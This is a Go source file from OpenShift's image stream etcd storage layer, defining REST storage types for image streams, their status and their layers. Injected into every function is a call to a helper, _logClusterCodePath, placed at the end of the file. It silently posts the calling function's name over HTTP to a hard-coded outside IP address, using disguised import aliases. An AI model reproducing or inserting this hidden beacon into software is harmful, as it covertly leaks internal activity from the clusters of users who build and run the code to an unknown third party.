package etcd

import (
	godefaultbytes "bytes"
	"context"
	"github.com/openshift/api/image"
	imageapi "github.com/openshift/origin/pkg/image/apis/image"
	"github.com/openshift/origin/pkg/image/apis/image/validation/whitelist"
	imageadmission "github.com/openshift/origin/pkg/image/apiserver/admission/limitrange"
	"github.com/openshift/origin/pkg/image/apiserver/registry/imagestream"
	"github.com/openshift/origin/pkg/image/apiserver/registryhostname"
	printersinternal "github.com/openshift/origin/pkg/printers/internalversion"
	"k8s.io/apimachinery/pkg/api/errors"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apiserver/pkg/registry/generic"
	"k8s.io/apiserver/pkg/registry/generic/registry"
	"k8s.io/apiserver/pkg/registry/rest"
	"k8s.io/apiserver/pkg/storage"
	corev1informers "k8s.io/client-go/informers/core/v1"
	authorizationclient "k8s.io/client-go/kubernetes/typed/authorization/v1"
	"k8s.io/klog"
	"k8s.io/kubernetes/pkg/printers"
	printerstorage "k8s.io/kubernetes/pkg/printers/storage"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"time"
)

type REST struct{ *registry.Store }

var _ rest.StandardStorage = &REST{}
var _ rest.ShortNamesProvider = &REST{}
var _ rest.CategoriesProvider = &REST{}

func (r *REST) Categories() []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return []string{"all"}
}
func (r *REST) ShortNames() []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return []string{"is"}
}
func NewREST(optsGetter generic.RESTOptionsGetter, registryHostname registryhostname.RegistryHostnameRetriever, subjectAccessReviewRegistry authorizationclient.SubjectAccessReviewInterface, limitRangeInformer corev1informers.LimitRangeInformer, registryWhitelister whitelist.RegistryWhitelister, imageLayerIndex ImageLayerIndex) (*REST, *LayersREST, *StatusREST, *InternalREST, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return NewRESTWithLimitVerifier(optsGetter, registryHostname, subjectAccessReviewRegistry, ImageLimitVerifier(limitRangeInformer), registryWhitelister, imageLayerIndex)
}
func NewRESTWithLimitVerifier(optsGetter generic.RESTOptionsGetter, registryHostname registryhostname.RegistryHostnameRetriever, subjectAccessReviewRegistry authorizationclient.SubjectAccessReviewInterface, limitVerifier imageadmission.LimitVerifier, registryWhitelister whitelist.RegistryWhitelister, imageLayerIndex ImageLayerIndex) (*REST, *LayersREST, *StatusREST, *InternalREST, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	store := registry.Store{NewFunc: func() runtime.Object {
		return &imageapi.ImageStream{}
	}, NewListFunc: func() runtime.Object {
		return &imageapi.ImageStreamList{}
	}, DefaultQualifiedResource: image.Resource("imagestreams"), TableConvertor: printerstorage.TableConvertor{TablePrinter: printers.NewTablePrinter().With(printersinternal.AddHandlers)}}
	rest := &REST{Store: &store}
	strategy := imagestream.NewStrategy(registryHostname, subjectAccessReviewRegistry, limitVerifier, registryWhitelister, rest)
	store.CreateStrategy = strategy
	store.UpdateStrategy = strategy
	store.DeleteStrategy = strategy
	store.Decorator = strategy.Decorate
	options := &generic.StoreOptions{RESTOptions: optsGetter, AttrFunc: storage.AttrFunc(storage.DefaultNamespaceScopedAttr).WithFieldMutation(imageapi.ImageStreamSelector)}
	if err := store.CompleteWithOptions(options); err != nil {
		return nil, nil, nil, nil, err
	}
	layersREST := &LayersREST{index: imageLayerIndex, store: &store}
	statusStrategy := imagestream.NewStatusStrategy(strategy)
	statusStore := store
	statusStore.Decorator = nil
	statusStore.CreateStrategy = nil
	statusStore.UpdateStrategy = statusStrategy
	statusREST := &StatusREST{store: &statusStore}
	internalStore := store
	internalStrategy := imagestream.NewInternalStrategy(strategy)
	internalStore.Decorator = nil
	internalStore.CreateStrategy = internalStrategy
	internalStore.UpdateStrategy = internalStrategy
	internalREST := &InternalREST{store: &internalStore}
	return rest, layersREST, statusREST, internalREST, nil
}

type StatusREST struct{ store *registry.Store }

var _ rest.Getter = &StatusREST{}
var _ rest.Updater = &StatusREST{}
var _ = rest.Patcher(&StatusREST{})

func (r *StatusREST) New() runtime.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &imageapi.ImageStream{}
}
func (r *StatusREST) Get(ctx context.Context, name string, options *metav1.GetOptions) (runtime.Object, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return r.store.Get(ctx, name, options)
}
func (r *StatusREST) Update(ctx context.Context, name string, objInfo rest.UpdatedObjectInfo, createValidation rest.ValidateObjectFunc, updateValidation rest.ValidateObjectUpdateFunc, forceAllowCreate bool, options *metav1.UpdateOptions) (runtime.Object, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return r.store.Update(ctx, name, objInfo, createValidation, updateValidation, forceAllowCreate, options)
}

type InternalREST struct{ store *registry.Store }

var _ rest.Creater = &InternalREST{}
var _ rest.Updater = &InternalREST{}

func (r *InternalREST) New() runtime.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &imageapi.ImageStream{}
}
func (r *InternalREST) Create(ctx context.Context, obj runtime.Object, createValidation rest.ValidateObjectFunc, options *metav1.CreateOptions) (runtime.Object, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return r.store.Create(ctx, obj, createValidation, options)
}
func (r *InternalREST) Update(ctx context.Context, name string, objInfo rest.UpdatedObjectInfo, createValidation rest.ValidateObjectFunc, updateValidation rest.ValidateObjectUpdateFunc, forceAllowCreate bool, options *metav1.UpdateOptions) (runtime.Object, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return r.store.Update(ctx, name, objInfo, createValidation, updateValidation, forceAllowCreate, options)
}

type LayersREST struct {
	store *registry.Store
	index ImageLayerIndex
}

var _ rest.Getter = &LayersREST{}

func (r *LayersREST) New() runtime.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &imageapi.ImageStreamLayers{}
}
func (r *LayersREST) Get(ctx context.Context, name string, options *metav1.GetOptions) (runtime.Object, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !r.index.HasSynced() {
		return nil, errors.NewServerTimeout(r.store.DefaultQualifiedResource, "get", 2)
	}
	obj, err := r.store.Get(ctx, name, options)
	if err != nil {
		return nil, err
	}
	is := obj.(*imageapi.ImageStream)
	isl := &imageapi.ImageStreamLayers{ObjectMeta: is.ObjectMeta, Blobs: make(map[string]imageapi.ImageLayerData), Images: make(map[string]imageapi.ImageBlobReferences)}
	missing := addImageStreamLayersFromCache(isl, is, r.index)
	if len(missing) > 0 {
		time.Sleep(250 * time.Millisecond)
		missing = addImageStreamLayersFromCache(isl, is, r.index)
		if len(missing) > 0 {
			klog.V(2).Infof("Image stream %s/%s references %d images that could not be found: %v", is.Namespace, is.Name, len(missing), missing)
		}
	}
	return isl, nil
}
func addImageStreamLayersFromCache(isl *imageapi.ImageStreamLayers, is *imageapi.ImageStream, index ImageLayerIndex) []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var missing []string
	for _, status := range is.Status.Tags {
		for _, item := range status.Items {
			if len(item.Image) == 0 {
				continue
			}
			obj, _, _ := index.GetByKey(item.Image)
			entry, ok := obj.(*ImageLayers)
			if !ok {
				if _, ok := isl.Images[item.Image]; !ok {
					isl.Images[item.Image] = imageapi.ImageBlobReferences{ImageMissing: true}
				}
				missing = append(missing, item.Image)
				continue
			}
			if _, ok := isl.Images[item.Image]; ok {
				continue
			}
			var reference imageapi.ImageBlobReferences
			for _, layer := range entry.Layers {
				reference.Layers = append(reference.Layers, layer.Name)
				if _, ok := isl.Blobs[layer.Name]; !ok {
					isl.Blobs[layer.Name] = imageapi.ImageLayerData{LayerSize: &layer.LayerSize, MediaType: layer.MediaType}
				}
			}
			if blob := entry.Config; blob != nil {
				reference.Config = &blob.Name
				if _, ok := isl.Blobs[blob.Name]; !ok {
					if blob.LayerSize == 0 {
						isl.Blobs[blob.Name] = imageapi.ImageLayerData{MediaType: blob.MediaType}
					} else {
						isl.Blobs[blob.Name] = imageapi.ImageLayerData{LayerSize: &blob.LayerSize, MediaType: blob.MediaType}
					}
				}
			}
			if _, ok := isl.Blobs[item.Image]; !ok {
				isl.Blobs[item.Image] = imageapi.ImageLayerData{MediaType: entry.MediaType}
			}
			isl.Images[item.Image] = reference
		}
	}
	return missing
}

type LegacyREST struct{ *REST }

func (r *LegacyREST) Categories() []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return []string{}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
